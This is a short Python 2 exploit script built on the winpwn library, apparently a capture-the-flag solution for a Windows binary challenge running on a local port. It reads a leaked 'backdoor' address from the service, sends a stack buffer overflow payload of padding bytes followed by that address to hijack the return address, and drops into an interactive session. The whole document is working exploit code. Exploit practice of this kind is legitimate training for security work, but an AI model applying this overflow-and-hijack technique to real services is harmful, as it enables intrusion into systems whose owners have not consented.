#coding:utf8
from winpwn import *

sh = remote('127.0.0.1',2333)
context.nocolor = None

def sendlineafter(a,b):
    sh.recvuntil(a)
    sh.sendline(b)

sh.sendlineafter = sendlineafter;
context.log_level = ''
sh.recvuntil('gift=')
backdoor = int(sh.recvuntil('\n')[0:-1],16)
print 'backdoor=',hex(backdoor)

payload = 'a'*0x28 + 'a'*0xC + p32(backdoor)
sh.sendlineafter('a:',payload)
sh.sendlineafter('b:','0')

sh.interactive()
